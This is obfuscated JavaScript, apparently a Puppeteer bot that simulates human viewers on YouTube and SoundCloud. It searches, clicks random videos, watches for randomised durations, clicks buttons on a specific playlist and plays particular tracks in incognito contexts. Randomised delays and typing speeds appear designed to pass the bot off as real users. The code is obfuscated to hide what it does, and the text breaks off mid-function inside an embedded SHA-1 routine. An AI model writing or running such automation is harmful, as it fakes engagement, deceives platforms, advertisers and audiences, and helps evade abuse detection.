function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xd * -0x29 + 0x20b7 + -0x1ea2);
    let h = e[f];
    return h;
  }, d(b, c);
}
const Y = b,
  X = c,
  W = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x4 * 0x2ce + 0x1341 + -0x1e78))) + i;
}
async function createPage(f, h) {
  const S = c,
    R = d;
  let i = await f[R(0xb)]();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x38 + 0x64d + -0x615), await i['goto'](h, {
    'waitUntil': ['domcontent' + S(0x1)],
    'timeout': 0x0
  }), i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xd * -0x29 + 0x20b7 + -0x1ea2);
    let h = e[f];
    if (c['bRaAAG'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x15 * 0x15f + -0x773 + -0x1558, r, s, t = 0xc2f + 0x825 + -0xa2a * 0x2; s = m['charAt'](t++); ~s && (r = q % (0x4 * 0x2ce + 0x1341 + -0x1e75) ? r * (-0x38 + 0x64d + -0x5d5) + s : s, q++ % (0x7c5 * -0x1 + -0x7db + 0x11e * 0xe)) ? o += String['fromCharCode'](0x4 * 0x819 + 0x1 * 0x19e0 + 0x1b * -0x21f & r >> (-(0x26b5 + 0x1261 + -0x3914) * q & 0x275 * -0x4 + -0xe59 + 0x3b * 0x69)) : -0x8 * 0x4b2 + 0x1090 + -0xe0 * -0x18) {
          s = n['indexOf'](s);
        }
        for (let u = -0x584 + 0x2bd * -0x4 + 0x20f * 0x8, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xc4d + -0x231c + 0xfd3 * 0x3))['slice'](-(-0x3 * -0x53d + -0x271 * -0xe + -0x31e3));
        }
        return decodeURIComponent(p);
      };
      c['HXmYcT'] = i, b = arguments, c['bRaAAG'] = !![];
    }
    const j = e[-0x6d2 + 0x1ebd + -0x17eb],
      k = f + j,
      l = b[k];
    return !l ? (h = c['HXmYcT'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x2e9b * -0x1 + -0x2f20 + 0x2a2f * 0x5 + (0x19 * 0x3e3 + 0x1 * 0x4da1 + 0x6f * -0x10c) * random()) : await standardWaitForNetIdle(f), await wait(0x26b5 + 0x1261 + -0x258e + (0x13a9 * -0x1 + -0x1cb2 + 0x8b * 0xa1) * random()), -0x8 * 0x4b2 + 0x1090 + -0x11b * -0x13;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x584 + 0x2bd * -0x4 + 0x300 * 0xc), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0xc4d + -0x231c + 0x77 * 0x66;
}
async function randomWait() {
  return await wait(-0x3 * -0x53d + -0x271 * -0xe + -0x1e5d + (-0x6d2 + 0x1ebd + -0x463) * random()), -0x1e20 + 0x1ec3 + -0x51 * 0x2;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xb4f + -0x3 * -0xa97 + -0x2b14, 0x2547 + 0x220d + -0x474d), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x1878e + 0xd072 + 0x258 * -0x9c) * getRandomInt(-0x2586 * -0x1 + -0x1122 + -0x1462, -0x17e1 + 0x9 * -0x2a1 + 0x2f8f), h)), -0x18 * -0x18d + -0xe33 + -0x1704;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1f3a + -0x1 * -0x1c2d + 0xb * 0x47;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xa1d + 0x2d * -0xbf + 0x1 * 0x1777]['split']('\x20');
    for (let k = -0x1c * -0xf2 + -0x156d + -0x50b; k < i['length']; k += -0x65 * 0x3b + 0x1d11 + -0x5c8)
      j += i[k] * h[i[k + (-0x22d * -0xf + -0x472 + -0x1c30)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const T = d,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te'](T(0x8)))['slice'](0xb9 * 0x1 + 0x1299 + -0x134c)['map'](l => Array['from'](l['children']))['flat'](0x207e + -0x2299 * -0x1 + -0x1 * 0x4316)['map'](l => l['childNodes'][-0x431 + 0x2 * -0x11d2 + 0x27d6]['childNodes'][-0x19d4 + -0x4e * 0x2b + 0x26ee]['childNodes'][-0x2570 + -0x201b + 0x458c]['childNodes'][-0x1759 + 0x136e + 0x3eb]['childNodes'][0x6 * 0x13e + 0x6 * -0x279 + -0x1 * -0x763]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x216a + 0xe17 * -0x1 + -0xf6b, 0x110f * 0x1 + -0xcd8 * 0x1 + 0xf51)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x19b8 * -0x2 + -0x2a7 + 0x9cf);
  const h = await getMaxTime(f),
    i = Math['min']((-0x4819 + 0x14d80 + -0x275 * 0xb) * getRandomInt(-0x92b * 0x4 + 0x2bd * 0x2 + 0x1f34, -0x1f * 0x75 + 0x9e8 + 0x448), h);
  return await wait(i), 0x1742 + 0xfff + 0x10 * -0x274;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x132f + 0x1 * -0x1603 + 0x2932]['children'][-0x3c5 + -0x9a + -0x3 * -0x175]['children'][0x1f * 0x116 + 0xa86 + -0xe * 0x328]['children'][-0x12 * -0x202 + 0x10c5 + -0xd7 * 0x3f]['children'][-0x1 * 0x2336 + -0x1b60 + 0x3e96]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xd19 + -0x1ef7 + 0x3d * 0x4b;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x44b * -0x1 + -0x5 * -0x63a + 0x2309 * -0x1 + (0x14c0 + -0x171c + 0x28e) * random()
  }), await wait(0xebc + -0x30f * -0x9 + -0x11 * 0x25f + (0x1 * -0x23dd + 0x1 * -0xe3 + -0xc * -0x329) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const U = d;
    if (!await f[U(0x14)](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x21e4 + -0x90 * 0x13 + -0x1732]['childNodes'][0xb8 * -0x1 + -0x41 * 0xa + -0xa7 * -0x5]['childNodes'][0x2568 + -0x1 * -0x1b4f + -0x40b6]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x43 + 0x20e6 + -0x2124]['childNodes'][-0x1204 + -0x7c7 * 0x3 + 0x845 * 0x5]['childNodes'][-0xb92 * -0x1 + 0x1 * -0x1736 + 0x47 * 0x2a]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xff7 + -0xf57 + 0x7 * 0x479),
          r = -0xb30 + -0xbdf + 0x170f;
        for (let u = -0x1 * 0x26ad + 0x2f0 + -0x7 * -0x51b; u < q['length']; u += 0x9d * 0xd + -0x8 * 0x24e + 0x7 * 0x17f)
          r += q[u] * k[q[u + (-0x3a9 * 0x7 + -0x23c9 * -0x1 + -0x11 * 0x99)]];
        return r;
      }(n);
  });
  await wait((-0xa3 * -0x67 + 0x59 * 0xd1 + -0x4fa6) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1801 + -0x4e3e * 0x5 + 0x7851 * 0x5) * getRandomInt(0x1010 + -0xd1b * -0x1 + 0x1 * -0x1d2a, -0x2 * -0x17f + -0x1 * 0xedb + 0xbe7), h + (-0x22ca + -0x1206 + 0x4858));
  return await wait(i), 0x1a2 + -0x22aa + 0xb03 * 0x3;
}

function a() {
  const bp = [
    'Eagle',
    'Bg9HzgvK',
    'BM9Uzq',
    'WPVcJqNdN8khW7uibCoVW6q',
    'ognkrfLLuMLmBG',
    'jf7cPrPLC1icvCop',
    '0.9,image/',
    '-Adblock_K',
    'class',
    '.com',
    'zd0Ltt/cKSkFmJ/dLG',
    'newPage',
    'ie5uideWlJaPia',
    'launch',
    'AhOwyT8aIh',
    'bcb_ZhJJK8',
    'ChrZl2j5lxnPDa',
    '_Xl_-b9P4U',
    'zwfZEwzVCMSUBW',
    'bYdcOq',
    'evaluate',
    'st\x20ex-empl',
    'ast-and-mo',
    'zw51C2vYANmUBW',
    'house,mr\x20b',
    '%8C%96%E8%',
    'node-fetch',
    'pts/430572',
    'Bw9VBw9VlMLVia',
    'WRldTCk/k1uCW4FcVLGb',
    'n3Kj8zEfew',
    'bCkxrmkFoSkrWRZcPrSy'
  ];
  a = function() {
    return bp;
  };
  return a();
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1 * -0x581 + -0x23f4 + 0x1e73), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const V = b;
        document['querySelec' + V(0x13, 'E5!R')]('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xa37 + 0x506 * -0x5 + 0x1a9f * 0x1 + (-0x18cf + 0x1bf2 + 0xc5) * Math['random']());
    });
  }, -0x2 * -0x17b + -0x48d * 0xa + 0x45e4);
  await wait(0x8dde2 + 0x1 * -0x179e7 + 0x2d01b * -0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x5fcf * -0x3 + 0x1f8 * -0x6a + 0x1 * 0x9ba3) * getRandomInt(0x2 * 0xee3 + -0xaf1 + -0x12d1, -0xcd * -0x25 + -0x33f * 0x7 + -0x15 * 0x53)), clearInterval(h), -0x7 * -0x251 + 0x2372 + 0x675 * -0x8;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x13c3 + 0x2649 + -0x1286 * 0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0xaeb + 0x1 * 0x25f0 + 0xd * -0x3c2;
    await randomWait();
  }
  return 0xf * 0x221 + 0x17d8 + -0x37c6;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1 * -0x1c8d + 0x150e + -0x65 * -0x13 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xd19 + -0xb31 + -0xc25 * -0x2 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x9df + 0x2062 * 0x1 + 0x175 * -0x1d + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x23ba + -0x2 * -0xc2f + -0x3c18 * 0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1 * 0xe6fe + 0x1 * -0x13b2e + 0x103f8 + getRandomInt(-0x1b34 + 0x72f9 + -0x2a7 * 0xb, -0x2037 + 0x12df * -0x5 + 0x29 * 0x5f2));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x20bb + 0x4cd * -0x4 + -0xd86), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x5c1 + -0x2e7 + -0x2da;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2701 + 0x19fa + 0xd07, 0x74e + 0x319 * -0x1 + -0x403)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x2 * 0x48e + 0x26cf * -0x1 + 0x37bb + floor((-0x2fa * -0x4 + 0x31c * 0x1 + -0xb1c) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xc4d41a1e + 0x38138586 * -0x2 + 0x1b4fb252a),
          -0xc6deb + -0xf06e3d + 0x17cdc28,
          0x5a7 * -0x1 + -0xd9 * -0x33 + 0x5a6c,
          -0x149 * 0x1d + 0x1a * -0xf4 + 0x3e8d
        ], y = [
          0x1d * 0x111 + 0x2d4 * -0x5 + -0x10b1,
          0x157b + 0x1 * 0x88 + 0x751 * -0x3,
          0x4f8 * 0x5 + 0xb31 * -0x3 + 0x1 * 0x8c3,
          0x1e7 * 0xb + 0x1b4 * 0x1 + -0x78b * 0x3
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x15 * 0x164 + -0x1a * 0x15b + 0x77 * 0xd)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1138 + 0x808 * 0x4 + -0x3158; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1924 + -0x155f * -0x1 + -0x3 * 0xf81) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x3 * 0x144 + 0x7f5 + -0x429] = A[0x8e * -0x13 + 0x1360 + -0x8c6] = A[0x6 * 0x1cf + -0x2d * -0xb6 + -0x2ad7] = A[0x144a + 0xc2 * -0x25 + 0x7c2 * 0x1] = A[0x15cd * 0x1 + 0x6 * -0x35e + -0x196] = A[0x621 + -0x170b * -0x1 + -0x1d28] = A[0x1 * 0x84a + 0x7d1 + 0x2 * -0x80b] = A[0x25f6 + -0x8dd * -0x3 + -0x4087] = A[-0xc0a * 0x1 + -0xee * 0x22 + 0x2bad * 0x1] = A[-0x6e3 + -0x1 * -0x130d + 0x1 * -0xc22] = A[0x1a7 * -0x8 + 0x1fa5 + -0x1264] = A[-0x19ec + -0x10a * -0xb + 0xe88] = A[-0x22b + -0x156a + 0x1b0 * 0xe] = A[0x138 + 0x856 + -0x982] = A[-0x1f6e + 0x1 * 0xc95 + 0x29 * 0x76] = A[-0x1 * 0xda8 + 0x8ec * 0x2 + 0x422 * -0x1] = A[0x5 * 0x74e + -0x1 * 0x128b + 0x8f6 * -0x2] = -0x81 * -0x3 + 0x8ee * -0x3 + -0x9 * -0x2cf, this['blocks'] = A) : this['blocks'] = [
                -0x2097 * -0x1 + -0x167 * 0x4 + 0x1afb * -0x1,
                -0xf54 + 0x346 + 0x1 * 0xc0e,
                -0x24cd * 0x1 + -0x26ea + 0xd5 * 0x5b,
                0x18fd + -0x6c7 * 0x5 + 0x8e6,
                0xc97 * 0x3 + 0x961 * 0x2 + -0x3887,
                0x1 * 0x1915 + 0x2b4 * -0x8 + -0x127 * 0x3,
                0x21ef + 0x90d + -0x2afc,
                -0xc25 * -0x2 + 0x568 + -0x1db2,
                0x1e43 + 0x13e3 + 0x83 * -0x62,
                -0x388 + -0x267 * -0x1 + 0x1 * 0x121,
                0x21 * -0x117 + 0xb19 + -0x1 * -0x18de,
                0x12c3 + 0x6c4 + -0x1987,
                0x1975 + 0x1 * -0x1213 + -0x762,
                -0x174a + -0x181d * -0x1 + 0xd3 * -0x1,
                0x67c + -0x694 + 0x18,
                -0xd13 * -0x1 + 0xc45 + -0x1958,
                0x1b4 * 0x7 + 0xbdb * -0x2 + -0xbca * -0x1
              ], this['h0'] = 0x6ce0a49f + -0x8595ae * -0x15 + 0x1832d * -0xaf4, this['h1'] = -0x5 * 0x2efb542f + 0x1a68cefb + 0x1c04d8179, this['h2'] = -0x1c9a6249 + -0x58add1 * -0x11 + 0xaf71b466, this['h3'] = -0x15c84feb + 0x7ce955 * 0x8 + -0x1 * -0x221359b9, this['h4'] = -0x2a * -0x1e3ba90 + -0x1718f26e7 * 0x1 + 0x1e6056d37, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1dc9 + -0x12d7 * -0x1 + -0x3a6 * -0x3, this['finalized'] = this['hashed'] = -0x1e7 * -0x10 + 0x269 * -0x1 + -0x1c07, this['first'] = 0x10a + 0x1505 + 0x3 * -0x75a;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x247f + -0x1 * 0x89b + 0x2e * 0xfb, O = J['length'] || 0xde + -0x14c6 + -0x2 * -0x9f4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xac * 0x2f + 0x492 + -0x2 * -0xd81, P[-0x13 * 0xdd + 0x26f * -0x2 + 0x9 * 0x25d] = this['block'], P[-0x15f * -0xa + 0x173a + 0x760 * -0x5] = P[-0xd82 + -0x2 * 0x1107 + 0x2f91] = P[-0x1aa4 + 0x1eb7 + -0x1 * 0x411] = P[-0x2238 + -0x265a * -0x1 + -0xd3 * 0x5] = P[-0x1867 * -0x1 + -0x111e + -0x745] = P[0x199f + -0x8 * 0x39a + -0x2 * -0x19b] = P[-0x17 * 0x10f + -0x1 * -0xe63 + -0x4 * -0x27f] = P[-0x1 * 0x129d + -0x107f + 0x5 * 0x707] = P[-0x236 + 0x2076 + 0x1 * -0x1e38] = P[0x1 * 0xff1 + 0x2 * 0x130d + 0x1 * -0x3602] = P[0xb87 + -0x161d + -0xaa0 * -0x1] = P[-0x15d + -0x1 * 0x3fb + 0x563] = P[0x3b * -0x1 + -0x541 + 0x1d8 * 0x3] = P[0x4d7 + -0x1bd1 + 0x9 * 0x28f] = P[-0xd9 * -0x17 + 0x1772 + -0x2ae3] = P[0x1755 + -0x1217 + -0x1 * 0x52f] = 0x6b * -0x1d + 0x2330 * -0x1 + 0x2f4f), K) {
                    for (N = this['start']; M < O && N < 0x2 * -0xde8 + 0x3 * -0xae + -0x1e1a * -0x1; ++M)
                      P[N >> -0x1 * -0x12d3 + 0x3 * 0x31c + -0x83 * 0x37] |= J[M] << y[-0x12a3 * -0x1 + -0x172b + -0x48b * -0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1 * -0x1d33 + 0x2110 + -0x1 * 0x39d; ++M)
                      (L = J['charCodeAt'](M)) < -0x15c2 + -0x55 * -0x5 + 0x1499 ? P[N >> 0x2f * -0x67 + -0xaff + 0x1dea] |= L << y[-0x140b + 0x1e86 + -0xa78 & N++] : L < -0x1454 + 0x7c0 + 0x1494 ? (P[N >> 0x1 * -0x10d5 + 0x24f * 0x6 + 0x2fd] |= (0xfa7 * 0x1 + -0x12cf + 0x8 * 0x7d | L >> -0x2001 + -0x4 * 0x81e + -0xb * -0x5dd) << y[0x1 * -0x146b + 0x1557 + -0xe9 & N++], P[N >> -0x4e4 + -0x1562 + 0x1a48] |= (0x39 * -0x2f + 0x1609 + 0xb12 * -0x1 | 0x1 * -0x26ab + 0x84b + -0x75 * -0x43 & L) << y[-0xaf7 + 0xa4c * 0x3 + 0x1 * -0x13ea & N++]) : L < 0x16f21 + 0x7 * -0x2911 + 0x442b * 0x2 || L >= 0x186bc + 0x2bfd * 0x9 + -0x232a1 ? (P[N >> 0x1b48 + -0xeb4 * 0x1 + 0x2 * -0x649] |= (-0x2 * 0x10b7 + -0x6 * -0x567 + -0x4 * -0x79 | L >> -0x883 + 0x2ce * -0xb + -0x9 * -0x461) << y[-0x1f0b + 0x40 * -0x10 + -0x2 * -0x1187 & N++], P[N >> -0x49 * -0x81 + 0x4 * -0x6e3 + 0x93b * -0x1] |= (-0x1 * -0x57a + -0x19ca + 0x14d0 | L >> 0xfb5 + -0x20c9 + 0x18e * 0xb & -0x9b + -0x1f * 0x131 + -0x239 * -0x11) << y[0x1 * 0x153d + -0x19c8 + 0x48e & N++], P[N >> 0x4 * 0x6a3 + -0x22b * -0x1 + 0x1cb5 * -0x1] |= (0xa * 0x3aa + 0x6ff + -0x2b23 | 0x25c2 + -0x178d + -0xdf6 & L) << y[-0x1d9d + 0x899 + 0x1 * 0x1507 & N++]) : (L = 0x11 * -0x1dcb + -0x224 * -0x71 + -0x1 * -0x20897 + ((0x334 * 0x1 + 0x1a6d + -0x19a2 & L) << 0x1 * 0x17b7 + 0x64a + 0x9fd * -0x3 | -0x2 * -0x10d + 0x20f4 + -0x1f0f & J['charCodeAt'](++M)), P[N >> 0x22fe + -0x1 * 0x4b8 + -0x1e44] |= (-0x1cfa + -0xf + 0x1df9 | L >> -0x56 * -0x30 + 0x28 * 0xe8 + -0x344e) << y[-0x78c + 0x1 * 0x234d + 0x2 * -0xddf & N++], P[N >> 0x2085 + -0x1873 + 0x2b * -0x30] |= (0x9c5 + 0x1cb1 + -0x2 * 0x12fb | L >> -0x1e67 + -0x143 * -0xd + -0xe0c * -0x1 & 0xa76 + 0x27 * 0x6d + 0x1 * -0x1ad2) << y[0x1adb + -0xc75 + 0x1 * -0xe63 & N++], P[N >> 0x1 * 0x8a6 + -0x462 + -0x442] |= (-0x24ad * -0x1 + 0xf90 + -0x3 * 0x113f | L >> -0x1 * 0xe09 + 0x1c39 + -0xe2a & 0x1297 + 0x1945 + -0x2b9d) << y[0x22fc + 0x1 * -0xc58 + -0x16a1 & N++], P[N >> -0xe9e + -0x6 * 0x29f + 0x3 * 0xa1e] |= (-0x156c + 0x15b * 0x2 + -0x1336 * -0x1 | -0x204 + 0x1ee9 * 0x1 + -0x1ca6 & L) << y[-0x1 * 0x1ae9 + -0x14c7 + 0x1 * 0x2fb3 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x34e * -0x3 + 0x5 * 0x68d + 0x1697 * -0x1 ? (this['block'] = P[0x8a * 0x12 + -0x1ba + -0x7ea], this['start'] = N - (-0x2 * 0x973 + -0xb97 + 0x1ebd), this['hash'](), this['hashed'] = 0x35 * -0xa0 + -0x12f8 + 0x1 * 0x3419) : this['start'] = N;
                }
                return this['bytes'] > -0x1593 * 0xed861 + -0x8e631 * 0x27b3 + 0x3a1909ff5 && (this['hBytes'] += this['bytes'] / (0x1e04788fc + -0x1d7967e20 + 0xf74ef524) << -0x149d + 0x911 + 0xb8c, this['bytes'] = this['bytes'] % (0xd108ad6 * 0x1c + -0xbf89e96c + 0x146eae81 * 0x4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1 * -0x2291 + 0x2134 + -0x43c4;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
